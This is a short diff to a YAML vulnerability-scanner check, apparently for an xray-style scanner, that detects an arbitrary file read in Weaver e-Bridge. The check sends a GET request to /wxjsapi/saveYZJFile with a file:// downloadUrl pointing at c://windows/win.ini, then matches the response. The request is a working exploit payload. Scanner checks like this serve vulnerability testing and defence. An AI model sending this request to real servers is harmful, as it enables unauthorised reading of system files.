@@ -1,9 +1,7 @@
-name: poc-yaml-e-bridge-win-file-read
-set:
-  testfile: c://windows/win.ini
+name: poc-yaml-weaver-e-bridge-win-file-read
 rules:
   - method: GET
-    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{{testfile}}&fileExt=txt
+    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
     follow_redirects: false
     expression: |
       response.status == 200 && response.body.bcontains(b"id")
